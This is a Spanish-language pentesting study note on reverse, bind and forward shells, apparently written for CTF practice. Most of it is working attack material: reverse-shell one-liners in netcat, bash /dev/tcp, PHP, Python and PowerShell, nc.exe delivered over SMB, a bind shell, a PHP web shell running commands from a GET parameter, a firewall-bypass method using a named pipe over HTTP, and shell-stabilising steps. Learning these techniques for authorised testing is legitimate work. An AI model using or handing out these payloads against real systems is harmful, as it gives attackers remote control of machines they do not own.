--------
- Tags: #vulnerabilidades #reverseshell #forwardshell #bindshell #ncat #netcat #conexiones
-------
# Definición

> Cuando nosotros encontremos una **vulnerabilidad** que nos permita **inyectar comandos** a nivel de sistema **dentro de la maquina que estemos intentando comprometer**, lo primero que vamos a querer conseguir es una **consola interactiva** para poder **maniobrar en el sistema** de una manera mas cómoda, ya sea para **listar archivos**, **contraseñas**, **directorios** o lo que nos interese. Para realizar esto se utilizan **diferentes técnicas**, nosotros veremos las **tres principales** las cuales veremos de manera muy frecuente, **Reverse Shell**, **Bind Shell**, y **Forward Shell**. Estas técnicas son esenciales de cara a la [[Introducción a la explotación de vulnerabilidades]] y **explotaciones mas avanzadas**.

> **Reverse Shell** es una técnica que permite a un atacante **conectarse a una máquina remota** desde una **máquina de su propiedad**. Es decir se establece **una conexión** desde la **máquina comprometida** hacia la **máquina del atacante**. Esto se logra **ejecutando un programa malicioso** o una instrucción específica en la **máquina remota** que **establece la conexión de vuelta** hacia la **máquina del atacante**, permitiéndole **tomar el control** de la máquina remota.

 > **Bind Shell** es una técnica que hace lo **opuesto de la Reverse Shell**, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es **el atacante quien se conecta a la máquina comprometida**. El atacante **escucha en un puerto determinado** y la máquina comprometida **acepta la conexión entrante en ese puerto**. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite **tomar el control de la misma**.

> **Forward Shell** es técnica se utiliza cuando **no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall** implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante **puede operar en la máquina remota**. En lugar de **establecer una conexión directa**, el atacante **redirige el tráfico** a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

Es importante **entender las diferencias entre estas técnicas** para poder **determinar cuál es la mejor opción** en función del escenario de ataque y las limitaciones de la red.

-------
# Detalles de las Técnicas

Para poder realizar cualquiera de estas tres técnicas hacemos uso de **herramientas de conexión**, en este caso utilizaremos la herramienta **Netcat (``nc``)** para poder **establecer la conexión**, pero **puede utilizarse cualquier otra**.
## Reverse Shell

En el caso de la **Reverse Shell**, lo que debemos hacer es **enviarnos una consola interactiva desde la maquina comprometida hacia nuestra maquina de atacante**.
Dentro de la inyección de comandos que encontremos, además de colocar comandos tales como **``ls``**, **``pwd``**, **``whoami``** y demás, podemos **colocar un comando especifico para enviar una consola interactiva** a nuestra maquina de atacante, esto se puede realizar con la herramienta **``ncat``** de la siguiente manera 
- **``ncat -e /bin/bash (ip.de.nuestramaquina) (puerto)``**
Antes de ejecutar dicho comando lo que debemos hacer es **colocarnos en escucha por un puerto que queramos** en nuestra maquina de atacante con el comando 
- **``nc -nlvp (puerto)``** ==(Debe coincidir con el puerto del comando que vayamos a inyectar)== 
Para cuando inyectemos el comando, se **establezca la conexión** y tengamos acceso y control a la maquina comprometida.

Una vez dentro de la máquina **para poder tener la consola mas estética** y ordenada usaremos ``script /dev/null -c bash``

En el caso de que **el servidor/maquina no posea la herramienta ``nc``**, existen **variantes** que podemos utilizar dependiendo de lo que posea, 

### Linux

==Reemplazando la IP por nuestra IP de atacante y el puerto por el que estemos en escucha== 

Por ejemplo para Linux:
- **``nc -e /bin/sh 10.0.0.1 1234``**
- **``bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"``** en el caso de que posea una bash.
- **``php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'``**
- **``python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``**

Todas estas variantes se puede consultar en [La siguiente Web](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

==Cabe aclarar== que a veces si intentamos entablar una **Reverse Shell** vía petición **``GET``** tenemos que **URLencodear** el caracter ``&`` que quedaría así ``%26``

-----
### Windows

Por ejemplo para Windows:

**En un archivo PHP** (==Máquina Love==)
```php
<?php
system("powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('IP-ATACANTE',PUERTO-ATACANTE); \$stream = \$client.GetStream(); [byte[]] \$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>
```

Subiendo un ``nc.exe`` a través de un servidor **SMB**. Dicho ejecutable está ubicado en ``/usr/share/SecLists/Web-Shells/FuzzDB/nc.exe`` que entabla conexión una vez se ejecuta de la siguiente forma (==Máquina Granny==)

- ``impacket-smbserver smbfolder $(pwd) -smb2support``
- ``\\10.10.14.25\smbFolder\nc.exe -e cmd <IP-ATACANTE> <PUERTO-ATACANTE>``

--------
## Bind Shell

En el caso de la **Bind Shell** como es al revés, lo que debemos hacer es inyectar un comando con "``ncat``" **ofreciendo una bash** a un puerto que queramos 
- **``ncat -nlvp (puerto) -e /bin/bash``** 
De esta manera lo que estamos haciendo es **abrir un puerto temporal** dado para **ofrecer una bash**, y ahora lo que deberíamos hacer es **conectarnos a la IP de la victima** desde nuestra máquina **mediante el puerto temporal** previamente abierto de la siguiente manera
- **``nc (Ip.delavictima) (puertotemporal)``**

---------
## Forward Shell

El **Forward Shell** se emplea cuando el **Firewall** de la red tiene **Flags pre-establecidas** para que no se permita conexiones **Reverse Shell** y **Bind Shell** o que evite el trafico saliente desde esa red. Para realizar esta técnica debemos emplear **mkfifo** para jugar con **archivos temporales** a través de los cuales de un **input que tu pongas** en uno de los archivos existentes **puedas ver el output en otro archivo**. La **Named Pipe** es el nombre de una **técnica para lograr la comunicación entre diferentes procesos**, esta es una **forma alternativa** para poder conseguir una **consola interactiva**, o una **TTY interactiva** y de esta manera **eludiríamos** el **Firewall**.

### Creación de contenedor con restricción de conexiones

Para dar un ejemplo de esto deberíamos crear un contenedor con Docker que posea el **``iptables``** instalado y con Flags adicionales configuradas. Para esto debemos agregar al comando **``docker run``** el siguiente parámetro **``--cap-add=NET_ADMIN``**, quedando tal que así 
- **``docker run -dit -p80:80 --cap-add=NET_ADMIN --name (nombredecontenedor) (IDdeimagen)``**
Luego volvemos a entrar al contenedor con **``exec``** y reinstalamos **``iptables``**.
Una vez realizado todo esto utilizaremos **``iptables``** para crear la siguiente regla para que por el **protocolo TCP** hacia el puerto destino 80, todas las conexiones **sean aceptadas**.
- **``iptables -A OUTPUT -p tcp -m tcp -o eth0 --sport 80 -j ACCEPT``**
Ahora queremos que todo lo demás por el protocolo TCP esté bloqueado, por ende usamos
- **``iptables -A OUTPUT -o eth0 -j DROP``**
==Cualquier duda que tengamos podemos buscar por internet "Como bloquear todas las conexiones menos las del puerto '80' en un contenedor"==
### Ejecución de Forward Shell

Imaginemos que de alguna forma, conseguimos subir un **archivo ``.php``** al **servidor/maquina**, para esto claramente tiene que tener instalado **``php``**. Simularemos esto creando un archivo llamado **``cmd.php``** en el directorio **``/var/www/html/``**, en el que contendrá un **script sencillo en php** que se va a encargar de **permitirnos controlar el comando que queramos ejecutar**, todo esto **mediante el empleo de etiquetas pre-formateadas** y haciendo uso de la **función**:

- `echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";` para ejecutar un **comando a nivel de sistema** mediante una petición por **``GET``**, y con el parámetro **"``cmd``"** controlar el comando que queremos ejecutar, concatenándole el **cierre de la etiqueta pre formateada** al final para que todo el contenido nos lo muestre de **manera ordenada** y no en una linea sola. Todo lo anterior dicho **dentro del script** quedaría de esta manera.

```php
<?php
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

Ahora lo que haremos será borrar el archivo **``index.html``** a modo de ejemplo para que cuando entremos a la web **solo nos muestre el contenido del directorio** como tal.
Una vez hecho esto **ingresamos a la ubicación del script** que hicimos y lo que hacemos es **agregar** luego de donde dice http://localhost/cmd.php en el **URL**, la siguiente sintaxis
- **``?cmd=(comandoquequeramos)``**. Podríamos **intentar utilizar algunas de las técnicas anteriores** de **Reverse** o **Bind** para intentar enviarnos una bash, pero veríamos que **no funciona**, ya que ==iptables está bloqueando las conexiones==. 

Con el ejemplo anterior **podremos ejecutar comandos a nivel de sistema** dentro del servidor/máquina, pero **no podremos utilizar herramientas desde ahí** como **``Nano``**, **``Vim``**, entre otras. **Tampoco podremos movernos entre directorios** con **``cd``**, ya que siempre estaremos ejecutando los cmd's **desde la raíz en donde está el servicio WEB montado**, en este caso **``/var/www/html/``**. Para poder adquirir una **``TTY``** (Un tipo de "consola" artificial interactiva) y que podamos **movernos libremente** luego de obtener el acceso a la maquina objetivo, podemos utilizar el [script creado](https://github.com/s4vitar/ttyoverhttp) por **S4vitar** en su perfil web de GitHub llamado [ttyoverhttp](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py) obteniéndolo con **``wget``**. 

- Editar dentro del script **``ttyoverhttp``** en donde pone **"``index.php``"**, cambiarlo por **"``cmd.php``"**, que es el **nombre de nuestro script creado** previamente.
- Editar el script **"``cmd.php``"** que creamos anteriormente **borrando las etiquetas pre-formateadas** para que **no entre en conflicto** con el script de S4vitar.

Ahora lo que resta es **intentar realizar** una **Reverse shell**, y cuando veamos que **no recibimos la consola** en nuestra maquina, **utilizamos el script** de S4vitar **``python3 tty_over_http.py``** y obtendríamos acceso **ignorando el Firewall**. Luego podríamos adquirir la consola interactiva con **``script /dev/null -c bash``**

----------
# Datos a tener en cuenta

Cuando hablamos de **procesos**, por ejemplo un **servicio HTTP**, siempre que nosotros estemos intentando comprometerlo, hay que tener bien en claro que **el proceso de ese servidor tiene que haber sido ejecutado como un usuario**. Lo típico es que el usuario en cuestión sea **www-data** que por defecto se encarga de gestionar los servicios web, pero puede variar y llamarse **root**, o **de cualquier otra manera**. Además algo a tener en cuenta cuando nosotros consigamos **inyectar un comando**, es que ese comando **siempre será ejecutado a nivel de usuario como el usuario propietario del servicio en cuestión**.

-------

**Tratamiento de la shell para poder ver todo mas cómodo.**

- ``script /dev/null -c bash``
- ``CTRL + Z``
- ``stty raw -echo; fg``
- ``reset xterm``
- ``stty size`` (En nuestra máquina y colocar el siguiente comando con las medidas que nos dio este)
- ``export TERM=xterm``
- ``export SHELL=bash``
- ``stty rows 41 columns 184``
- ``export TERM=xterm`` (Para el clear de consola)